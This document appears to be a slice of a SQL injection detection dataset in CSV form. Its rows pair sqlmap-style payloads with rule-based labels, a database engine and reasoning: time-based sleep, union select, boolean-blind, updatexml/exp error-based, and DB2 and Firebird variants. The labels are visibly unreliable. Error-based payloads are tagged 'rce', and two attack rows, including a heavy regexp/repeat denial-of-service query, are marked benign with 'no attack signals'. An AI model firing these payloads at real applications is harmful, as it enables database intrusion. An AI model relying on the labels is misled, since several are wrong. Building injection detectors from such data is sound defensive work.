row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
6420,"1 ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 9914 = 9914",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
6421,"1' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 'udvq' = 'udvq",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6422,"-5078 union all select 9708,9708--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6423,1' where 1770 = 1770,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6424,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) # huhw",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6425,"1 ) where 1185 = 1185 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
6426,-6129 ) as vuze where 1565 = 1565 or ( 8459 = 8459 ) *4906--,1,,boolean_blind,generic,0.95,1565 = 1565 or detected — boolean_blind injection (priority 8) on generic,rule-based
6427,"-8325 ) ) as ajxq where 6630 = 6630 union all select 6630,6630,6630,6630,6630,6630--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6428,"1 where 4968 = 4968 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
6429,"-7941%' ) union all select 6965,6965,6965,6965--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6430,1%' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6431,"-8034"" ) where 1292 = 1292 union all select 1292,1292,1292,1292,1292#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6432,1'+ ( select ggah where 3263 = 3263 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) +',1,,boolean_blind,firebird,0.95,3263 = 3263 and detected — boolean_blind injection (priority 8) on firebird,rule-based
